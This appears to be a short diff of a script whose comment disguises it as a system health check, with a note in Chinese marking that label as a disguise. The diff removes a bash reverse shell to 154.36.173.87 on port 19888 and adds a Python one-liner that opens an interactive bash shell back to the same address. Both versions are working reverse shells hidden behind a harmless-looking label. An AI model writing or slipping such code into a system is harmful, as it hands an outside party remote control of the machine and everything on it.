@@ -1,3 +1,1 @@
-#!/bin/bash
-# System Health Check (伪装注释)
-bash -c '0<&102-;exec 102<>/dev/tcp/154.36.173.87/19888;sh <&102 >&102 2>&102'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.36.173.87",19888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
